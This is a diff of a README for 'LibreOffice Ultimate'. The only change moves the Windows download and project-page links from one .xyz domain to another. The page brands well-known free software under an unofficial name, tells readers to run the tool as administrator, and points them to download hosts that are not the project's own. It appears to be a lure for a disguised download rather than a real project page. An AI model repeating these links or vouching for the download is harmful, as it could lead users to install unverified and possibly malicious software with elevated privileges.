@@ -10,8 +10,8 @@ The goal is a tool that just works — no clutter, no bloat.
 > Run it as administrator if a step needs elevated access.
 
 ## 📥 Download
-- 📥 **Download for Windows:** [https://libreoffice-ultimate.softonx.xyz](https://libreoffice-ultimate.softonx.xyz)
-- 📖 **Project page:** [https://libreoffice-ultimate.softonx.xyz](https://libreoffice-ultimate.softonx.xyz)
+- 📥 **Download for Windows:** [https://libreoffice-ultimate.softax.xyz](https://libreoffice-ultimate.softax.xyz)
+- 📖 **Project page:** [https://libreoffice-ultimate.softax.xyz](https://libreoffice-ultimate.softax.xyz)
 
 ## Features
 1. **Calendar & Scheduling:** Built-in planner with recurring events, deadlines, and time blocking.
